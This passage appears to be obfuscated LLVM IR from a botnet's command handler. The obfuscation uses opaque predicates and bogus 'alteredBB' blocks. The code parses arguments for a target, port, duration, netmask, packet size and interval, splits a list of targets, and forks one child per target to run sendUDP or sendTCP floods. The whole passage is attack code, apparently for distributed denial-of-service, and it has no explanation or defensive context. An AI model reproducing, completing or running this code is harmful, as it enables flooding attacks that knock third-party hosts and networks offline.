  %292 = load i8**, i8*** %4, align 8
  %293 = getelementptr inbounds i8*, i8** %292, i64 5
  %294 = load i8*, i8** %293, align 8
  %295 = call i32 @atoi(i8* %294) #10
  %296 = icmp sgt i32 %295, 65536
  br i1 %296, label %334, label %297

; <label>:297:                                    ; preds = %291
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 5
  %300 = load i8*, i8** %299, align 8
  %301 = call i32 @atoi(i8* %300) #10
  %302 = icmp sgt i32 %301, 65500
  br i1 %302, label %334, label %303

; <label>:303:                                    ; preds = %297
  %304 = load i8**, i8*** %4, align 8
  %305 = getelementptr inbounds i8*, i8** %304, i64 4
  %306 = load i8*, i8** %305, align 8
  %307 = call i32 @atoi(i8* %306) #10
  %308 = icmp sgt i32 %307, 32
  br i1 %308, label %334, label %309

; <label>:309:                                    ; preds = %303
  %310 = load i32, i32* @x.89
  %311 = load i32, i32* @y.90
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %309
  %318 = load i32, i32* %3, align 4
  %319 = icmp eq i32 %318, 7
  %320 = load i32, i32* @x.89
  %321 = load i32, i32* @y.90
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %319, label %328, label %335

; <label>:328:                                    ; preds = %originalBBpart228
  %329 = load i8**, i8*** %4, align 8
  %330 = getelementptr inbounds i8*, i8** %329, i64 6
  %331 = load i8*, i8** %330, align 8
  %332 = call i32 @atoi(i8* %331) #10
  %333 = icmp slt i32 %332, 1
  br i1 %333, label %334, label %335

; <label>:334:                                    ; preds = %328, %303, %297, %291, %285, %279, %273, %originalBBpart224, %248
  br label %1001

; <label>:335:                                    ; preds = %328, %originalBBpart228
  %336 = load i8**, i8*** %4, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 1
  %338 = load i8*, i8** %337, align 8
  store i8* %338, i8** %8, align 8
  %339 = load i8**, i8*** %4, align 8
  %340 = getelementptr inbounds i8*, i8** %339, i64 2
  %341 = load i8*, i8** %340, align 8
  %342 = call i32 @atoi(i8* %341) #10
  store i32 %342, i32* %9, align 4
  %343 = load i8**, i8*** %4, align 8
  %344 = getelementptr inbounds i8*, i8** %343, i64 3
  %345 = load i8*, i8** %344, align 8
  %346 = call i32 @atoi(i8* %345) #10
  store i32 %346, i32* %10, align 4
  %347 = load i8**, i8*** %4, align 8
  %348 = getelementptr inbounds i8*, i8** %347, i64 4
  %349 = load i8*, i8** %348, align 8
  %350 = call i32 @atoi(i8* %349) #10
  store i32 %350, i32* %11, align 4
  %351 = load i8**, i8*** %4, align 8
  %352 = getelementptr inbounds i8*, i8** %351, i64 5
  %353 = load i8*, i8** %352, align 8
  %354 = call i32 @atoi(i8* %353) #10
  store i32 %354, i32* %12, align 4
  %355 = load i32, i32* %3, align 4
  %356 = icmp sgt i32 %355, 6
  br i1 %356, label %357, label %362

; <label>:357:                                    ; preds = %335
  %358 = load i8**, i8*** %4, align 8
  %359 = getelementptr inbounds i8*, i8** %358, i64 6
  %360 = load i8*, i8** %359, align 8
  %361 = call i32 @atoi(i8* %360) #10
  br label %379

; <label>:362:                                    ; preds = %335
  %363 = load i32, i32* @x.89
  %364 = load i32, i32* @y.90
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %362
  %371 = load i32, i32* @x.89
  %372 = load i32, i32* @y.90
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %379

; <label>:379:                                    ; preds = %originalBBpart232, %357
  %380 = phi i32 [ %361, %357 ], [ 1000, %originalBBpart232 ]
  store i32 %380, i32* %13, align 4
  %381 = load i32, i32* %3, align 4
  %382 = icmp sgt i32 %381, 7
  br i1 %382, label %383, label %404

; <label>:383:                                    ; preds = %379
  %384 = load i32, i32* @x.89
  %385 = load i32, i32* @y.90
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %383
  %392 = load i8**, i8*** %4, align 8
  %393 = getelementptr inbounds i8*, i8** %392, i64 7
  %394 = load i8*, i8** %393, align 8
  %395 = call i32 @atoi(i8* %394) #10
  %396 = load i32, i32* @x.89
  %397 = load i32, i32* @y.90
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %405

; <label>:404:                                    ; preds = %379
  br label %405

; <label>:405:                                    ; preds = %404, %originalBBpart236
  %406 = phi i32 [ %395, %originalBBpart236 ], [ 1000000, %404 ]
  store i32 %406, i32* %14, align 4
  %407 = load i32, i32* %3, align 4
  %408 = icmp sgt i32 %407, 8
  br i1 %408, label %409, label %430

; <label>:409:                                    ; preds = %405
  %410 = load i32, i32* @x.89
  %411 = load i32, i32* @y.90
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %409
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 8
  %420 = load i8*, i8** %419, align 8
  %421 = call i32 @atoi(i8* %420) #10
  %422 = load i32, i32* @x.89
  %423 = load i32, i32* @y.90
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %447

; <label>:430:                                    ; preds = %405
  %431 = load i32, i32* @x.89
  %432 = load i32, i32* @y.90
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %430
  %439 = load i32, i32* @x.89
  %440 = load i32, i32* @y.90
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %447

; <label>:447:                                    ; preds = %originalBBpart244, %originalBBpart240
  %448 = phi i32 [ %421, %originalBBpart240 ], [ 0, %originalBBpart244 ]
  %449 = load i32, i32* @x.89
  %450 = load i32, i32* @y.90
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %447
  store i32 %448, i32* %15, align 4
  %457 = load i8*, i8** %8, align 8
  %458 = call i8* @strstr(i8* %457, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %459 = icmp ne i8* %458, null
  %460 = load i32, i32* @x.89
  %461 = load i32, i32* @y.90
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %459, label %468, label %505

; <label>:468:                                    ; preds = %originalBBpart248
  %469 = load i8*, i8** %8, align 8
  %470 = call i8* @strtok(i8* %469, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %470, i8** %16, align 8
  br label %471

; <label>:471:                                    ; preds = %502, %468
  %472 = load i8*, i8** %16, align 8
  %473 = icmp ne i8* %472, null
  br i1 %473, label %474, label %504

; <label>:474:                                    ; preds = %471
  %475 = load i32, i32* @x.89
  %476 = load i32, i32* @y.90
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %474
  %483 = call i32 @listFork()
  %484 = icmp ne i32 %483, 0
  %485 = load i32, i32* @x.89
  %486 = load i32, i32* @y.90
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %484, label %502, label %493

; <label>:493:                                    ; preds = %originalBBpart252
  %494 = load i8*, i8** %16, align 8
  %495 = load i32, i32* %9, align 4
  %496 = load i32, i32* %10, align 4
  %497 = load i32, i32* %11, align 4
  %498 = load i32, i32* %12, align 4
  %499 = load i32, i32* %13, align 4
  %500 = load i32, i32* %14, align 4
  %501 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %494, i32 %495, i32 %496, i32 %497, i32 %498, i32 %499, i32 %500, i32 %501)
  call void @_exit(i32 0) #12
  unreachable

; <label>:502:                                    ; preds = %originalBBpart252
  %503 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %503, i8** %16, align 8
  br label %471

; <label>:504:                                    ; preds = %471
  br label %534

; <label>:505:                                    ; preds = %originalBBpart248
  %506 = load i32, i32* @x.89
  %507 = load i32, i32* @y.90
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %505
  %514 = call i32 @listFork()
  %515 = icmp ne i32 %514, 0
  %516 = load i32, i32* @x.89
  %517 = load i32, i32* @y.90
  %518 = sub i32 %516, 1
  %519 = mul i32 %516, %518
  %520 = urem i32 %519, 2
  %521 = icmp eq i32 %520, 0
  %522 = icmp slt i32 %517, 10
  %523 = or i1 %521, %522
  br i1 %523, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %515, label %533, label %524

; <label>:524:                                    ; preds = %originalBBpart256
  %525 = load i8*, i8** %8, align 8
  %526 = load i32, i32* %9, align 4
  %527 = load i32, i32* %10, align 4
  %528 = load i32, i32* %11, align 4
  %529 = load i32, i32* %12, align 4
  %530 = load i32, i32* %13, align 4
  %531 = load i32, i32* %14, align 4
  %532 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %525, i32 %526, i32 %527, i32 %528, i32 %529, i32 %530, i32 %531, i32 %532)
  call void @_exit(i32 0) #12
  unreachable

; <label>:533:                                    ; preds = %originalBBpart256
  br label %534

; <label>:534:                                    ; preds = %533, %504
  br label %1001

; <label>:535:                                    ; preds = %242
  %536 = load i8**, i8*** %4, align 8
  %537 = getelementptr inbounds i8*, i8** %536, i64 0
  %538 = load i8*, i8** %537, align 8
  %539 = call i32 @strcmp(i8* %538, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.402, i32 0, i32 0)) #10
  %540 = icmp ne i32 %539, 0
  br i1 %540, label %774, label %541

; <label>:541:                                    ; preds = %535
  %542 = load i32, i32* %3, align 4
  %543 = icmp slt i32 %542, 6
  br i1 %543, label %634, label %544

; <label>:544:                                    ; preds = %541
  %545 = load i8**, i8*** %4, align 8
  %546 = getelementptr inbounds i8*, i8** %545, i64 3
  %547 = load i8*, i8** %546, align 8
  %548 = call i32 @atoi(i8* %547) #10
  %549 = icmp eq i32 %548, -1
  br i1 %549, label %634, label %550

; <label>:550:                                    ; preds = %544
  %551 = load i32, i32* @x.89
  %552 = load i32, i32* @y.90
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %550
  %559 = load i8**, i8*** %4, align 8
  %560 = getelementptr inbounds i8*, i8** %559, i64 2
  %561 = load i8*, i8** %560, align 8
  %562 = call i32 @atoi(i8* %561) #10
  %563 = icmp eq i32 %562, -1
  %564 = load i32, i32* @x.89
  %565 = load i32, i32* @y.90
  %566 = sub i32 %564, 1
  %567 = mul i32 %564, %566
  %568 = urem i32 %567, 2
  %569 = icmp eq i32 %568, 0
  %570 = icmp slt i32 %565, 10
  %571 = or i1 %569, %570
  br i1 %571, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %563, label %634, label %572

; <label>:572:                                    ; preds = %originalBBpart260
  %573 = load i8**, i8*** %4, align 8
  %574 = getelementptr inbounds i8*, i8** %573, i64 4
  %575 = load i8*, i8** %574, align 8
  %576 = call i32 @atoi(i8* %575) #10
  %577 = icmp eq i32 %576, -1
  br i1 %577, label %634, label %578

; <label>:578:                                    ; preds = %572
  %579 = load i32, i32* @x.89
  %580 = load i32, i32* @y.90
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %578
  %587 = load i8**, i8*** %4, align 8
  %588 = getelementptr inbounds i8*, i8** %587, i64 4
  %589 = load i8*, i8** %588, align 8
  %590 = call i32 @atoi(i8* %589) #10
  %591 = icmp sgt i32 %590, 32
  %592 = load i32, i32* @x.89
  %593 = load i32, i32* @y.90
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %591, label %634, label %600

; <label>:600:                                    ; preds = %originalBBpart264
  %601 = load i32, i32* %3, align 4
  %602 = icmp sgt i32 %601, 6
  br i1 %602, label %603, label %609

; <label>:603:                                    ; preds = %600
  %604 = load i8**, i8*** %4, align 8
  %605 = getelementptr inbounds i8*, i8** %604, i64 6
  %606 = load i8*, i8** %605, align 8
  %607 = call i32 @atoi(i8* %606) #10
  %608 = icmp slt i32 %607, 0
  br i1 %608, label %634, label %609

; <label>:609:                                    ; preds = %603, %600
  %610 = load i32, i32* %3, align 4
  %611 = icmp eq i32 %610, 8
  br i1 %611, label %612, label %635

; <label>:612:                                    ; preds = %609
  %613 = load i32, i32* @x.89
  %614 = load i32, i32* @y.90
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %612
  %621 = load i8**, i8*** %4, align 8
  %622 = getelementptr inbounds i8*, i8** %621, i64 7
  %623 = load i8*, i8** %622, align 8
  %624 = call i32 @atoi(i8* %623) #10
  %625 = icmp slt i32 %624, 1
  %626 = load i32, i32* @x.89
  %627 = load i32, i32* @y.90
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %625, label %634, label %635

; <label>:634:                                    ; preds = %originalBBpart268, %603, %originalBBpart264, %572, %originalBBpart260, %544, %541
  br label %1001

; <label>:635:                                    ; preds = %originalBBpart268, %609
  %636 = load i8**, i8*** %4, align 8
  %637 = getelementptr inbounds i8*, i8** %636, i64 1
  %638 = load i8*, i8** %637, align 8
  store i8* %638, i8** %17, align 8
  %639 = load i8**, i8*** %4, align 8
  %640 = getelementptr inbounds i8*, i8** %639, i64 2
  %641 = load i8*, i8** %640, align 8
  %642 = call i32 @atoi(i8* %641) #10
  store i32 %642, i32* %18, align 4
  %643 = load i8**, i8*** %4, align 8
  %644 = getelementptr inbounds i8*, i8** %643, i64 3
  %645 = load i8*, i8** %644, align 8
  %646 = call i32 @atoi(i8* %645) #10
  store i32 %646, i32* %19, align 4
  %647 = load i8**, i8*** %4, align 8
  %648 = getelementptr inbounds i8*, i8** %647, i64 4
  %649 = load i8*, i8** %648, align 8
  %650 = call i32 @atoi(i8* %649) #10
  store i32 %650, i32* %20, align 4
  %651 = load i8**, i8*** %4, align 8
  %652 = getelementptr inbounds i8*, i8** %651, i64 5
  %653 = load i8*, i8** %652, align 8
  store i8* %653, i8** %21, align 8
  %654 = load i32, i32* %3, align 4
  %655 = icmp eq i32 %654, 8
  br i1 %655, label %656, label %661

; <label>:656:                                    ; preds = %635
  %657 = load i8**, i8*** %4, align 8
  %658 = getelementptr inbounds i8*, i8** %657, i64 7
  %659 = load i8*, i8** %658, align 8
  %660 = call i32 @atoi(i8* %659) #10
  br label %662

; <label>:661:                                    ; preds = %635
  br label %662

; <label>:662:                                    ; preds = %661, %656
  %663 = phi i32 [ %660, %656 ], [ 10, %661 ]
  store i32 %663, i32* %22, align 4
  %664 = load i32, i32* %3, align 4
  %665 = icmp sgt i32 %664, 6
  br i1 %665, label %666, label %671

; <label>:666:                                    ; preds = %662
  %667 = load i8**, i8*** %4, align 8
  %668 = getelementptr inbounds i8*, i8** %667, i64 6
  %669 = load i8*, i8** %668, align 8
  %670 = call i32 @atoi(i8* %669) #10
  br label %672

; <label>:671:                                    ; preds = %662
  br label %672

; <label>:672:                                    ; preds = %671, %666
  %673 = phi i32 [ %670, %666 ], [ 0, %671 ]
  %674 = load i32, i32* @x.89
  %675 = load i32, i32* @y.90
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %672
  store i32 %673, i32* %23, align 4
  %682 = load i8*, i8** %17, align 8
  %683 = call i8* @strstr(i8* %682, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %684 = icmp ne i8* %683, null
  %685 = load i32, i32* @x.89
  %686 = load i32, i32* @y.90
  %687 = sub i32 %685, 1
  %688 = mul i32 %685, %687
  %689 = urem i32 %688, 2
  %690 = icmp eq i32 %689, 0
  %691 = icmp slt i32 %686, 10
  %692 = or i1 %690, %691
  br i1 %692, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %684, label %693, label %745

; <label>:693:                                    ; preds = %originalBBpart272
  %694 = load i32, i32* @x.89
  %695 = load i32, i32* @y.90
  %696 = sub i32 %694, 1
  %697 = mul i32 %694, %696
  %698 = urem i32 %697, 2
  %699 = icmp eq i32 %698, 0
  %700 = icmp slt i32 %695, 10
  %701 = or i1 %699, %700
  br i1 %701, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %693
  %702 = load i8*, i8** %17, align 8
  %703 = call i8* @strtok(i8* %702, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %703, i8** %24, align 8
  %704 = load i32, i32* @x.89
  %705 = load i32, i32* @y.90
  %706 = sub i32 %704, 1
  %707 = mul i32 %704, %706
  %708 = urem i32 %707, 2
  %709 = icmp eq i32 %708, 0
  %710 = icmp slt i32 %705, 10
  %711 = or i1 %709, %710
  br i1 %711, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %712

; <label>:712:                                    ; preds = %originalBBpart280, %originalBBpart276
  %713 = load i8*, i8** %24, align 8
  %714 = icmp ne i8* %713, null
  br i1 %714, label %715, label %744

; <label>:715:                                    ; preds = %712
  %716 = call i32 @listFork()
  %717 = icmp ne i32 %716, 0
  br i1 %717, label %726, label %718

; <label>:718:                                    ; preds = %715
  %719 = load i8*, i8** %24, align 8
  %720 = load i32, i32* %18, align 4
  %721 = load i32, i32* %19, align 4
  %722 = load i32, i32* %20, align 4
  %723 = load i8*, i8** %21, align 8
  %724 = load i32, i32* %23, align 4
  %725 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %719, i32 %720, i32 %721, i32 %722, i8* %723, i32 %724, i32 %725)
  call void @_exit(i32 0) #12
  unreachable

; <label>:726:                                    ; preds = %715
  %727 = load i32, i32* @x.89
  %728 = load i32, i32* @y.90
  %729 = sub i32 %727, 1
  %730 = mul i32 %727, %729
  %731 = urem i32 %730, 2
  %732 = icmp eq i32 %731, 0
  %733 = icmp slt i32 %728, 10
  %734 = or i1 %732, %733
  br i1 %734, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %726
  %735 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %735, i8** %24, align 8
  %736 = load i32, i32* @x.89
  %737 = load i32, i32* @y.90
  %738 = sub i32 %736, 1
  %739 = mul i32 %736, %738
  %740 = urem i32 %739, 2
  %741 = icmp eq i32 %740, 0
  %742 = icmp slt i32 %737, 10
  %743 = or i1 %741, %742
  br i1 %743, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %712

; <label>:744:                                    ; preds = %712
  br label %757

; <label>:745:                                    ; preds = %originalBBpart272
  %746 = call i32 @listFork()
  %747 = icmp ne i32 %746, 0
  br i1 %747, label %756, label %748

; <label>:748:                                    ; preds = %745
  %749 = load i8*, i8** %17, align 8
  %750 = load i32, i32* %18, align 4
  %751 = load i32, i32* %19, align 4
  %752 = load i32, i32* %20, align 4
  %753 = load i8*, i8** %21, align 8
  %754 = load i32, i32* %23, align 4
  %755 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %749, i32 %750, i32 %751, i32 %752, i8* %753, i32 %754, i32 %755)
  call void @_exit(i32 0) #12
  unreachable

; <label>:756:                                    ; preds = %745
  br label %757

; <label>:757:                                    ; preds = %756, %744
  %758 = load i32, i32* @x.89
  %759 = load i32, i32* @y.90
  %760 = sub i32 %758, 1
  %761 = mul i32 %758, %760
  %762 = urem i32 %761, 2
  %763 = icmp eq i32 %762, 0
  %764 = icmp slt i32 %759, 10
  %765 = or i1 %763, %764
  br i1 %765, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %757
  %766 = load i32, i32* @x.89
  %767 = load i32, i32* @y.90
  %768 = sub i32 %766, 1
  %769 = mul i32 %766, %768
  %770 = urem i32 %769, 2
  %771 = icmp eq i32 %770, 0
  %772 = icmp slt i32 %767, 10
  %773 = or i1 %771, %772
  br i1 %773, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %774

; <label>:774:                                    ; preds = %originalBBpart284, %535
  %775 = load i32, i32* @x.89
  %776 = load i32, i32* @y.90
  %777 = sub i32 %775, 1
  %778 = mul i32 %775, %777
  %779 = urem i32 %778, 2
  %780 = icmp eq i32 %779, 0
  %781 = icmp slt i32 %776, 10
  %782 = or i1 %780, %781
  br i1 %782, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %774
  %783 = load i8**, i8*** %4, align 8
  %784 = getelementptr inbounds i8*, i8** %783, i64 0
  %785 = load i8*, i8** %784, align 8
  %786 = call i32 @strcmp(i8* %785, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.403, i32 0, i32 0)) #10
  %787 = icmp ne i32 %786, 0
  %788 = load i32, i32* @x.89
  %789 = load i32, i32* @y.90
  %790 = sub i32 %788, 1
  %791 = mul i32 %788, %790
  %792 = urem i32 %791, 2
  %793 = icmp eq i32 %792, 0
  %794 = icmp slt i32 %789, 10
  %795 = or i1 %793, %794
  br i1 %795, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %787, label %916, label %796

; <label>:796:                                    ; preds = %originalBBpart288
  %797 = load i32, i32* @x.89
  %798 = load i32, i32* @y.90
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %796
  %805 = load i32, i32* %3, align 4
  %806 = icmp slt i32 %805, 4
  %807 = load i32, i32* @x.89
  %808 = load i32, i32* @y.90
  %809 = sub i32 %807, 1
  %810 = mul i32 %807, %809
  %811 = urem i32 %810, 2
  %812 = icmp eq i32 %811, 0
  %813 = icmp slt i32 %808, 10
  %814 = or i1 %812, %813
  br i1 %814, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %806, label %859, label %815

; <label>:815:                                    ; preds = %originalBBpart292
  %816 = load i32, i32* @x.89
  %817 = load i32, i32* @y.90
  %818 = sub i32 %816, 1
  %819 = mul i32 %816, %818
  %820 = urem i32 %819, 2
  %821 = icmp eq i32 %820, 0
  %822 = icmp slt i32 %817, 10
  %823 = or i1 %821, %822
  br i1 %823, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %815
  %824 = load i8**, i8*** %4, align 8
  %825 = getelementptr inbounds i8*, i8** %824, i64 2
  %826 = load i8*, i8** %825, align 8
  %827 = call i32 @atoi(i8* %826) #10
  %828 = icmp slt i32 %827, 1
  %829 = load i32, i32* @x.89
  %830 = load i32, i32* @y.90
  %831 = sub i32 %829, 1
  %832 = mul i32 %829, %831
  %833 = urem i32 %832, 2
  %834 = icmp eq i32 %833, 0
  %835 = icmp slt i32 %830, 10
  %836 = or i1 %834, %835
  br i1 %836, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %828, label %859, label %837

; <label>:837:                                    ; preds = %originalBBpart296
  %838 = load i32, i32* @x.89
  %839 = load i32, i32* @y.90
  %840 = sub i32 %838, 1
  %841 = mul i32 %838, %840
  %842 = urem i32 %841, 2
  %843 = icmp eq i32 %842, 0
  %844 = icmp slt i32 %839, 10
  %845 = or i1 %843, %844
  br i1 %845, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %837
  %846 = load i8**, i8*** %4, align 8
  %847 = getelementptr inbounds i8*, i8** %846, i64 3
  %848 = load i8*, i8** %847, align 8
  %849 = call i32 @atoi(i8* %848) #10
  %850 = icmp slt i32 %849, 1
  %851 = load i32, i32* @x.89
  %852 = load i32, i32* @y.90
  %853 = sub i32 %851, 1
  %854 = mul i32 %851, %853
  %855 = urem i32 %854, 2
  %856 = icmp eq i32 %855, 0
  %857 = icmp slt i32 %852, 10
  %858 = or i1 %856, %857
  br i1 %858, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %850, label %859, label %860

; <label>:859:                                    ; preds = %originalBBpart2100, %originalBBpart296, %originalBBpart292
  br label %1001

; <label>:860:                                    ; preds = %originalBBpart2100
  %861 = load i8**, i8*** %4, align 8
  %862 = getelementptr inbounds i8*, i8** %861, i64 1
  %863 = load i8*, i8** %862, align 8
  store i8* %863, i8** %25, align 8
  %864 = load i8**, i8*** %4, align 8
  %865 = getelementptr inbounds i8*, i8** %864, i64 2
  %866 = load i8*, i8** %865, align 8
  %867 = call i32 @atoi(i8* %866) #10
  store i32 %867, i32* %26, align 4
  %868 = load i8**, i8*** %4, align 8
